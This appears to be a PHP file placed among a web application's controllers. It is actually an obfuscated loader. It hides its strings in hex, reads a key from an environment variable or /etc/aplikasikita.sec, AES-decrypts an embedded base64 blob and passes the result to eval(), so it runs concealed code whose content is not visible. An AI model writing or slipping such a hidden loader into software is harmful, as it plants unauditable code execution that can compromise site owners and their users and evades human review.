<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('G3cxTHjEVjDpd3A4q8AG7Q==');

$c=base64_decode(

'stQz11Oq8jW9+YGZGoHcCv7t3Ew1PGK84l93ch6siYEu6cij2SvWWK8L2NDvtvWFSGk+BXIAU6ko' .
'RSYMGnBT42CmU2oVMX46W1jYsOvN8v9tPEP8n5uiH06GcNPkSa0z0sg4NP2i95EW4sLGULPKF8o6' .
'tqtH76zUWbcRgmdHYtWtKqeDeSi7Nur4KtCuevdHM9NUSYDdsOu7pRrl4h2UiR52zzft9W/jJV4Q' .
'ue6QRHClMP22E//JwLNHOUZMXLq9h2yNM/aUCR7kxte3LRc/BOgWQeHGWP5NbvDbvgmJx8k='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

